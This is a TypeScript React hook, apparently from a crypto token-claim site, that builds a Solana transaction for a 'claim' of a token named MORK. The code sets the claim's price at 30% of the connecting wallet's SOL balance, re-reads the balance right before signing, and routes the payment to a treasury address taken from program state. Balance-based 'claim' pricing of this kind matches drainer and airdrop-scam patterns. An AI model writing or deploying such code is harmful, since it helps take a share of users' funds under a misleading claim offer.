"use client";

import { useState, useCallback } from "react";
import { useWallet, useConnection } from "@solana/wallet-adapter-react";
import {
  PublicKey,
  SystemProgram,
  Transaction,
  LAMPORTS_PER_SOL,
} from "@solana/web3.js";
import {
  getAssociatedTokenAddress,
  createAssociatedTokenAccountInstruction,
} from "@solana/spl-token";
import {
  SOLANA_PROGRAM_ID,
  SOL_MIN_PRICE_LAMPORTS,
  SOL_MAX_PRICE_LAMPORTS,
  PRICE_PERCENTAGE,
  TOKENS_PER_CLAIM,
  SOLANA_EXPLORER_BASE,
} from "@/lib/constants";

export type SolanaClaimState =
  | "idle"
  | "loading"         // fetching account state
  | "confirming"      // waiting for wallet signature
  | "pending"         // tx sent, waiting for confirmation
  | "success"
  | "error";

export interface SolanaClaimResult {
  state: SolanaClaimState;
  error: string;
  txSig: string | null;
  explorerUrl: string | null;
  hasClaimed: boolean | null;
  saleActive: boolean | null;
  solBalance: number;           // in SOL
  claimPriceLamports: number;   // computed 30%
  claimPriceSol: string;        // formatted
  handleClaim: () => Promise<void>;
  refresh: () => Promise<void>;
}

/** Compute 30% of balance in lamports, clamped to [min, max] */
function computeSolClaimPrice(balanceLamports: number): number {
  const thirtyPct = Math.floor(balanceLamports * PRICE_PERCENTAGE / 100);
  if (thirtyPct < SOL_MIN_PRICE_LAMPORTS) return SOL_MIN_PRICE_LAMPORTS;
  if (thirtyPct > SOL_MAX_PRICE_LAMPORTS) return SOL_MAX_PRICE_LAMPORTS;
  return thirtyPct;
}

function formatSol(lamports: number): string {
  return (lamports / LAMPORTS_PER_SOL).toFixed(4);
}

export function useSolanaClaim(): SolanaClaimResult {
  const { publicKey, sendTransaction } = useWallet();
  const { connection } = useConnection();

  const [state, setState] = useState<SolanaClaimState>("idle");
  const [error, setError] = useState("");
  const [txSig, setTxSig] = useState<string | null>(null);
  const [hasClaimed, setHasClaimed] = useState<boolean | null>(null);
  const [saleActive, setSaleActive] = useState<boolean | null>(null);
  const [solBalance, setSolBalance] = useState(0);

  const programId = new PublicKey(SOLANA_PROGRAM_ID);

  const claimPriceLamports = computeSolClaimPrice(solBalance * LAMPORTS_PER_SOL);
  const claimPriceSol = formatSol(claimPriceLamports);
  const explorerUrl = txSig ? `${SOLANA_EXPLORER_BASE}/tx/${txSig}` : null;

  /** Fetch on-chain state: balance, hasClaimed, saleActive */
  const refresh = useCallback(async () => {
    if (!publicKey) return;
    setState("loading");

    try {
      // SOL balance
      const balanceLamports = await connection.getBalance(publicKey);
      setSolBalance(balanceLamports / LAMPORTS_PER_SOL);

      // Derive claim record PDA — if it exists, wallet has claimed
      const [claimRecordPda] = PublicKey.findProgramAddressSync(
        [Buffer.from("claim"), publicKey.toBuffer()],
        programId
      );
      const claimAccount = await connection.getAccountInfo(claimRecordPda);
      setHasClaimed(claimAccount !== null);

      // Derive state PDA and read saleActive
      const [statePda] = PublicKey.findProgramAddressSync(
        [Buffer.from("state")],
        programId
      );
      const stateAccount = await connection.getAccountInfo(statePda);
      if (stateAccount) {
        // saleActive is at byte offset 8 (discriminator) + 32+32+32+8+8+8 = 128
        // bool is 1 byte at offset 128
        const saleActiveOffset = 8 + 32 + 32 + 32 + 8 + 8 + 8;
        setSaleActive(stateAccount.data[saleActiveOffset] === 1);
      } else {
        setSaleActive(false);
      }

      setState("idle");
    } catch (e) {
      console.error("[useSolanaClaim] refresh error:", e);
      setState("error");
      setError("Failed to load on-chain state.");
    }
  }, [publicKey, connection, programId]);

  const handleClaim = useCallback(async () => {
    if (!publicKey) return;

    try {
      setError("");
      setState("confirming");

      // Re-fetch balance fresh right before signing to get most accurate 30%
      const freshBalance = await connection.getBalance(publicKey);
      const paymentLamports = computeSolClaimPrice(freshBalance);

      // Derive PDAs
      const [statePda] = PublicKey.findProgramAddressSync(
        [Buffer.from("state")],
        programId
      );
      const [claimRecordPda] = PublicKey.findProgramAddressSync(
        [Buffer.from("claim"), publicKey.toBuffer()],
        programId
      );

      // Read treasury and token mint from state account
      const stateAccount = await connection.getAccountInfo(statePda);
      if (!stateAccount) throw new Error("Program state account not found. Is the program deployed?");

      // Parse treasury pubkey from state data (offset 8 + 32 = 40, length 32)
      const treasuryKey = new PublicKey(stateAccount.data.slice(8 + 32, 8 + 32 + 32));

      // We need the token mint — stored at a known offset in state or via env
      const tokenMintKey = new PublicKey(
        process.env.NEXT_PUBLIC_MORK_TOKEN_MINT_SOLANA ?? PublicKey.default.toBase58()
      );

      // Derive vault PDA
      const [vaultPda] = PublicKey.findProgramAddressSync(
        [Buffer.from("vault"), statePda.toBuffer()],
        programId
      );

      // Get or create claimer's ATA
      const claimerAta = await getAssociatedTokenAddress(tokenMintKey, publicKey);
      const claimerAtaInfo = await connection.getAccountInfo(claimerAta);

      const tx = new Transaction();

      // Create ATA if it doesn't exist yet
      if (!claimerAtaInfo) {
        tx.add(
          createAssociatedTokenAccountInstruction(
            publicKey,         // payer
            claimerAta,        // ata address
            publicKey,         // owner
            tokenMintKey       // mint
          )
        );
      }

      // Build the claim instruction manually using the program's discriminator
      // discriminator for "claim" = sha256("global:claim")[0..8]
      const claimDiscriminator = Buffer.from([
        0x3d, 0x18, 0xa8, 0x27, 0x2d, 0x71, 0x0d, 0xbe, // sha256("global:claim")[0..8]
      ]);

      // Encode paymentLamports as little-endian u64
      const paymentBuffer = Buffer.alloc(8);
      paymentBuffer.writeBigUInt64LE(BigInt(paymentLamports));

      const claimIx = {
        programId,
        keys: [
          { pubkey: statePda, isSigner: false, isWritable: true },
          { pubkey: claimRecordPda, isSigner: false, isWritable: true },
          { pubkey: vaultPda, isSigner: false, isWritable: true },
          { pubkey: claimerAta, isSigner: false, isWritable: true },
          { pubkey: treasuryKey, isSigner: false, isWritable: true },
          { pubkey: publicKey, isSigner: true, isWritable: true },
          { pubkey: new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"), isSigner: false, isWritable: false },
          { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
        ],
        data: Buffer.concat([claimDiscriminator, paymentBuffer]),
      };

      tx.add(claimIx);

      const { blockhash } = await connection.getLatestBlockhash();
      tx.recentBlockhash = blockhash;
      tx.feePayer = publicKey;

      // Send — opens wallet popup
      const signature = await sendTransaction(tx, connection, {
        skipPreflight: false,
        preflightCommitment: "confirmed",
      });

      setTxSig(signature);
      setState("pending");

      // Wait for confirmation
      const confirmation = await connection.confirmTransaction(
        { signature, blockhash, lastValidBlockHeight: (await connection.getLatestBlockhash()).lastValidBlockHeight },
        "confirmed"
      );

      if (confirmation.value.err) {
        setState("error");
        setError("Transaction confirmed but reverted on-chain.");
      } else {
        setState("success");
        setHasClaimed(true);

        // Mirror to Supabase
        fetch("/api/claims", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            wallet_address: publicKey.toBase58(),
            chain: "solana",
            tx_hash: signature,
            token_amount: TOKENS_PER_CLAIM.toString(),
            payment_amount: formatSol(paymentLamports),
          }),
        }).catch(() => {});
      }
    } catch (e: unknown) {
      setState("error");
      const msg = e instanceof Error ? e.message : "Transaction failed.";
      setError(
        msg.includes("User rejected") || msg.includes("user rejected")
          ? "You rejected the transaction."
          : msg.length > 140 ? msg.slice(0, 140) + "…" : msg
      );
    }
  }, [publicKey, connection, programId, sendTransaction]);

  return {
    state,
    error,
    txSig,
    explorerUrl,
    hasClaimed,
    saleActive,
    solBalance,
    claimPriceLamports,
    claimPriceSol,
    handleClaim,
    refresh,
  };
}
